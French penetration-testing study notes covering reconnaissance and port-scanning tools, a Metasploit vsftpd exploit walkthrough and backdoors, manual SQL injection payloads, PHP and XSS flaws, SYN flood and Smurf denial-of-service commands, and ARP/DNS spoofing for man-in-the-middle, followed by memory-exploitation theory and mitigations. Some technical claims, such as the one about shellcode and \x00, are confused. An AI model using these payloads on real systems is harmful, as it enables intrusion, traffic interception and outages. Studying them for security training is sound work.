# informations publiques

- Social engineering Kevin Mitnick

- www.archive.org
- www.alexa.com
- serversniff.net
- www.whois.net
 
- Whois -> informations sur un site
- host [nom-de-domaine] -> retourne l'adresse ip d'un site
- Maltego -> informations sur une personne (demande de s'enregistrer)
- Dnsenum [nom-de-domaine] -> informations sur le nom de domaine
- Dig [nom-de-domaine] -> informations sur le nom de domaine
- Dmitry ---> Beaucoup d'infos sur un nom de domaine, voir infos
- Tcptraceroute -> informations
- Theharvester -> récupérer des adresses ip, sous-domain etc.

# enumeration des machines

- ping [-s taille-paquet] [-i interface] [-c nombre-paquets-envoyés] [ip] -> permet de savoir si une adresse ip est valide sur le réseau
- arping -> Utilise arp pour faire un ping
- fping [-s nom-domaine] [-r x] [-g ip/cidr] [ip] -> envoyer ping à plusieurs machines en même temps

## hping 3

- forgeage de paquet.
- ex icmp : hping3 -1 [ip] -c 1 --------> envoi un paquet (-c 1) de type icmp (-i)
- options -0 : raw-ip, -1 : icmp, -2 : udp, -8 : scan, -9 listen

- test de règle de firewall: 
- hping3 [ip] -c 1 -S [-p port] -s 6060

## nping

- forgeage de paquet
- ex tcp/22 : nping --tcp -c 1 -p 22 [ip]

# scan de port et prise d'empreinte de service

## nmap

- nmap [ip] -> scan de base, liste port ouvert et service sur le port
- nmap [ip/cidr] -> scan de base d'un réseau
- nmap -p x,y,z,.. -> spécifie plusieurs ports
- nmap -sN -> scan Null
- nmap -sU -> scan UDP
- nmap -sV -> scan et chope la version
- nmap -A -> scan aggressif, cherche le systeme d'exploitation, version, port ouvert etc.
- xsltproc a.xml -o b.html -> transforme a en b
- zenmap -> version graphique d'nmap

## unicornscan

- permet de choisir le nombre de paquets envoyés en un certains temps etc.
- unicornscan -r x ----> x paquets par seconde (pps)
- unicornscan -m U -Iv [ip:port] -> scan udp, affichage verbose,

## amap

- proxy de trigger au niveau de ports
- cp /etc/amap/appdefs.trig ----> triggers utilisés par les ports
- amap -bp [ip] [port] -> get des services au niveau des ports

## nbtscan

- nbtscan [ip ou réseau] -> nom netbios sur le réseau
- nbtscan -hv -> informations sur la machine via smb

## onesixtyone

- onesixtyone [ip] -> information snmp de la machine
- onesixtyone -d [ip] -> liste exhaustive des informations

## nessus

- openvas?

# prise d'empreinte de systeme

2 façons d'os fingerprinting : 
- active : analyser les réponses du réseau au niveau de 
- passif : analyser des paquets sur un réseau sans dialoguer directement avec

## nmap

- analyse active
- nmap -O [ip] ----> recherche de l'os

## p0f

- analyse passive, analyse SYN, SYN+ACK et RST+mode
- lent
- p0f -i -p -o -> (p : promiscuité)(o : output)(i : interface)


# vulnérabilité poste client

- armitage -> interface graphique pour metasploit

# metasploit (msfconsole)

- show exploits ---> liste des exploits
- search [rechercher] -----> recherche, possible aussi dans le site de metasploit
- show payloads ----> liste payload 

- use [nom exploit] -----> utiliser un exploit
- show options ------> options du payload/exploit


- show auxiliary ------> plugins/modules de metasploit

## différents modules

- listener : composant qui attent une connexion entrante
- msfcli : mini-langage utilisé pour les test, quand on connait l'exploit
- msfpayload : génère des shellcodes, executables composant etc.
- msfencode : encode les payloads
- nasm shell : asm

## exemple d'un exploit

- db_nmap -sV [ip] ----> scan la machine
- services --------> voir les services tournant sur la cible
- search vsftpd 2.3.4 ------> cherche les exploits pour un service
- use [exploit] -----> utilise l'exploit
- show options ------> voir les options de l'exploit
- set RHOST [ip] ------> modifie l'option RHOST
- show payloads -------> montre les payloads de l'exploit
- exploit ------> commencer l'exploit, on est maintenant sur l'autre machine

# vulnérabilité navigateur web

- beef-xss ------> lance beef
- mdp par défaut ---------> beef/beef

- msf> use auxiliary/server/browser_autopwn
- options lhost
- options uri

# vulnérabilité poste client/persistance/backdoor

- meterpreter ----> utilisé comme un payload après exploit metaploit
- permet de couvrir les traces, rendre l'exploit persistant, effacer les traces etc.

- interserct -----> post-exploitation, récolter fichiers mdp, 
- copier clé ssh, informatiosn réseau, identifier logiciel sécurité

- msfvenom ----> permet de couler une backdoor dans une application
- run mesfvc ---->  backdoor persistante


# vulnerabilité web

- OWASP : outil de référence pour la secu appli web
- OWASP ZED ATTACK PROXY (zap)

# cartographie d'un site web

- cartographier un site ---> récupérer le plan du site (arborescence)
- url/uri ----> emplacement d'une ressource
- les ressources sont locales ou externes
- pour les sites dynamiques on parle de "prise d'empreinte" et non de cartographie

- vega : injection SQL, faille-xss, 
- scanner pour test rapides et proxy filtrant pour inspection

- burp suite: plateforme complète pour test de sec
- analyser/modifier et rejouer des requetes
- approfondir la recherche des vulnérabilités web

# failles php

## failles include

- <?php include('truc.php'); ?>
- exploit locale ou distante
- (exemple sur DVWA)

### protection faille include

- file_exists('page') --> empécher l'ouverture de la page si elle n'existep as niveau php
- .HTACESS -----> de même, niveau serveur web

## faille upload

- permet de backdoorer un serveur
- exploit : double extension, bypass mime, selection repertoire destination

### protection faille include

- renommer les fichiers avec des noms aléatoire et sans extension (hash)
- config htacess
- interdire certaines fonctions critiques au niveau serveur


# Failles SQL

- SQLMap
- OWASP Zed Attack proxy
- Hash identifier

- Manuel : 
    1. envoyer requete : 1
    2. envoyer : 1' (si il y a une erreur la faille est présente)
    3. envoyer : 1' OR 1=1# --> affiche tout le contenue de la table
    4. envoyer : 1' OR 1=1 UNION SELECT null,version()# ---> affiche la version du serveur
    5. envoyer : 1' OR 1=1 UNION SELECT null,table_name() FROM INFORMATION_SCHEMA.tables#
    ----> nom de toutes les tables
    6. envoyer ! 1' OR 1=1 UNION SELECT null,column_name FROM INFORMATION_SCHEMA.columns 
    WHERE table_name ='x' --> nom des colonnes d'une table


- Hash-identifier : permet d'identifier le type de hash.
- www.md5cracker.org

- sqlmap [-u adresse cible] [--cookie=x] [--dump], injection automatique


- zaproxy
- activer un proxy dans la connexion internet (sur zap)
- lancer un balayage du site

## comment se protéjer

- éviter les interpréteurs
- encoder toutes les données fournies par l'utilisateur
- effectuver une validation "white list"
- minimiser les privilèges dans les bases
- attention à la façon d'enter les paramètres dans les tables (sqlsrv_query)

## Failles XSS

- forcer l'utilisateur à aller vers un lien internet qu'il n'a pas choisi
pour récupérer des informations
- Reflected XSS ----> non persistant, le pirate envoi un url piégé à une victime
- Stored XSS ---> persistant, le pirate stode un fichier sur un serveur et envoi
le lien vers le fichier à la victime

- BeEF : The browser Exploitation Framework
- XSSer
- ZAP

- Executer un script dans une zone de texte permet de savoir si une faille est présente
-
## CSRF cross-script request forgery

- par exemple, en cliquant sur un lien, un serveur va envoyer tous ses cookies etc.
- (revoir ?)

# Vulnérabilité Réseau

## Idle Host Scanning (Zombie scanning)

- On scan un port sur une machine, mais celle-ci pense que c'est une autre
personne qui la scan
- Utilisation de la numérotation des paquets ip (champ id du protocole ip)
- Utilisation d'un pc zombie qui va servir d'intermédiaire entre
le pirate et la cible

- Utilisation de scapy

## Deni de service

- Consiste à saturer une cible (routeur etc)

### SYN flood : envoi de plein de SYN à la cible

- metasploit : 
- user auxiliary/dos/tcp/synflood
- set RHOST=IPVICTIME
- exploit

### Smurf : Un attaquant envoi de plein ping à la cible
- scapy:
- requete = send(IP(src=IPVictime, dst=adresseBroadcast)/ICMP(),count=100)

## Sniffing Réseau

- Consiste à intercepter des paquets et analyser celui-ci
- Ettercap : Man in the middle grâce à ARP
- Wireshark

- Ettercap -G : interface graphique
- sniff > unified sniffing
- Hosts -> Host list, scan for host
- Mitm -> arp poisoning -> sniff remote connexion

## Spoofing Réseau

- Envoyer des paquets IP en utilisant une adresse IP source
qui n'a pas été attributée à l'ordinateur émetteur (Mascarade IP)
- Sert à : masquer son ip, usurper identité, modifier paquets entre deux sources

- DNSChef : proxy DNS, création de faux domaines et controler le traffic d'une victime
- Arpspoof : forger paquets ARP entre 2 communicant, cache ARP et MAC


- dnschef --fakeip=[ip] --fakedomains [domaine] --interface [ip] -q
- arpspoof -t [ipCible] [ipDOntOnUsurpeLadresse]
- ettercap -G : sniff/unified sniffing hosts/hosts_list add_to_target mitm/arp_poisonning
Sniff Remote Connexion et Only poison one-way
Plugin > dns_spoof
puis aller vers le dossier /etc/ettercap/etter.dns qui va servir 
de dns


## Man in the middle

- faire en sorte qu'un pirate soit un relay entre 2 communicant
- DrifNet et Ettercap
- 3vilTwinAttacker
- Urlsnarf


- Ettercap -G : add to target 1/add to target 2 (man in the middle à proprement parler)
- driftnet (voir les images de la victime)
- urlsnarf -i [interface] (voir les url visité par la machine victime)
- 3viltwinattacker dans le fichier /usr/share/3vilTwinAttacker/Templates/Phising pour retrouver des
  infos phishées

# Vulnerabilités Applicatives

- Un programme charge des éléments en mémoire pendant l'exécution
- Le processeur peut suivre des instructions dans la mémoire ainsi chargée
- Un programme gère à la fois ses variables et ses instructions
- L'organisation de la mémoire se fait par segmentation
- les segments sont: 
    - .text : taille statique et accès en lecture
    - .bss : taille statique et accès lecture/ecriture
    - .data : taille statique et accès lecture/écriture
    - tas : taille dynamique et accès lecture/écriture
    - pile: taille dynamique et accès lecture/écriture, sert notamment à
    créer le contexte d'exécution
- les exploitation se font le plus souvent grâce à la pile et au tas

## Buffer overflow

- dépassement de la mémoire
- consiste en une copie de données dans la pile sans vérification de la taille
- Permet de faire executer des instructions introduites dans le processus

- Stack overflow
- Injection de shellcode
- Depassement de capacité
- Ecrasement SEIP

- Ex: entrer un mot de passe trop long dans un char[] en C

## Interger overflow

- Consiste à produire une valeur supérieur aux valeurs stockable


## Format string

- Si on ne donne pas le bon nombre d'arguments à printf, 
les arguments vont quand même être stockés dans la pile
- exemple : printf(argv[1]);
- on envoi à argv[1] des valeurs de formatage (%s,%x,%hn etc.)


### MItigation

- Spécifier l'adresse où écrire (direct parameter Access)
- Ecriture d'une valeur précise
- Formatage obligatoire

## Shellcode

- String représentant des instructions machines qui va
être exécuté par la machine
- ex:  \x01\x05\xDB\x55 etc.
- un shellcode se termine toujours par l'instruction \x00
et ne doit donc pas en contenir
- l'intérer est de pouvoir l'intégrer dans un programme de façon
invisible. Sachant qu'il doit être très court, car un shellcode
peut vite faire planter un programme

## Protection des failles applicatives

- ASLR : Address Space Layout Randomization -> placer de façon aléatoire
les zones de données d'un programme comme la pile, rend
plus difficile le buffer overflow
- ldd permet de verifier cette option (liste les bibliothèques partagées)
- DEP :  "Data execution prevention" -> empêche l'execution de code 
depuis des blocs .data ou .bss
- Bit NX --> dans le processeur, dissocie les zones de mémoire
instructions et données.

# Contremesure

- La séparation des droits doit se faire de façon très précise
- Système de journalisation
- Suivi
- La menace peut être aussi bien interne qu'externe
- La menace peut être volontaire ou accidentelle
- Snort ---> détection d'intruction (nids)
